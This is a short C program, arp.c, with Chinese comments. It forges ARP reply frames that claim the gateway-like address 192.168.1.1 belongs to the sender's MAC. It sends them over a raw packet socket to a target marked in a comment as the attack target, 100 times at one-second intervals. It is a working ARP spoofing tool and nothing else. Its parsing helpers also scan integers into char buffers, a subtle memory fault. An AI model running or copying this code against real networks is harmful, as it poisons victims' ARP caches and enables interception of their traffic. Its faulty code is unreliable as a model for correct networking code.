/******************************************************************************
*    > File Name: arp.c
*
*    >Description: 
*
*    >Version: 1.0
*    > Created Time: 2013年10月27日 星期日 19时32分38秒
*    >Revision: none
*    >Compiler: gcc
*
*    > Author: linzhenhua
*    > Mail: linzhenhualzh@163.com 
*    > Company: 
*
******************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if_arp.h>
#include <net/ethernet.h>

#define ARP_LEN 28

/*格式化提取mac地址*/
void mac_str(char *mac, char *buf)
{
    sscanf(mac, "%x:%x:%x:%x:%x:%x", buf+0, buf+1, buf+2, buf+3, buf+4, buf+5);
}

/*格式化提取IP地址*/
void ip_str(char *ip, char *buf)
{
    sscanf(ip, "%d.%d.%d.%d", buf+0, buf+1, buf+2, buf+3);
}

/*封装帧*/
void encapsulate_frame(char *dest_mac, char *source_mac, unsigned int type, char *buf)
{
    mac_str(dest_mac, buf);
    mac_str(source_mac, buf+6);
    *(short *)(buf+12) = htons(type);
}

/*封装arp*/
void encapsulate_arp(unsigned short ar_op, char *source_mac, char *source_ip, char *dest_mac, char *dest_ip, char *buf)
{
    struct arphdr parp;

    parp.ar_hrd = htons(ARPHRD_ETHER);     //硬件类型
    parp.ar_pro = htons(ETHERTYPE_IP);     //协议类型
    parp.ar_hln = 6;                       //硬件地址长度48位 6个字节
    parp.ar_pln = 4;                       //协议地址长度32位 4个字节
    parp.ar_op = htons(ar_op);             //操作字段(ARP应答)
    memcpy(buf, &parp, sizeof(struct arphdr));

    char addr_buf[20];
    mac_str(source_mac, addr_buf);
    ip_str(source_ip, addr_buf+6);
    mac_str(dest_mac, addr_buf+10);
    ip_str(dest_ip, addr_buf+16);
    memcpy(buf+sizeof(struct arphdr), addr_buf, 20);
}

/*打开套接字*/
int open_packet_socket(void)
{
    int sockfd;

    if( (sockfd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_RARP))) < 0 )
    {
        perror("socket");
        exit(-1);
    }

    return sockfd;
}

/*主函数*/
int main(int argc, char **argv)
{
    int i;
    int sockfd;               //套接字描述符

    struct sockaddr to;       //通用套接口地址结构

    char *source_ip = "192.168.1.1";            //my linux IP(伪装的IP)
    char *source_mac = "00:0C:29:55:C3:16";     //my linux mac
    
    char *dest_ip = "192.168.1.99";              //目的IP(攻击目标)
    char *dest_mac = "00:0C:29:77:5A:66";         //目的mac

    /*用于存储以太网帧和ARP帧*/
    char *buf = (char *)malloc( sizeof(struct ether_header) + ARP_LEN );
    if(NULL == buf)
    {
        exit(-1);
    }

    /*封装以太网帧*/
    encapsulate_frame(dest_mac, source_mac, ETHERTYPE_ARP, buf);
    /*封装ARP帧*/
    encapsulate_arp(ARPOP_REPLY, source_mac, source_ip, dest_mac, dest_ip, buf+sizeof(struct ether_header));

    /*创建套接字*/
    sockfd = open_packet_socket();

    /*封装地址*/
    bzero(&to, sizeof(struct sockaddr));
    to.sa_family = AF_INET;
    strcpy(to.sa_data, "eth0");    //地址是以太网

    for(i = 0; i < 100; ++i)
    {
        sendto( sockfd, buf, sizeof(struct ether_header)+ARP_LEN, 0, &to, sizeof(struct sockaddr) );
        sleep(1);
    }

    printf("send over\n");

    return 0;
}
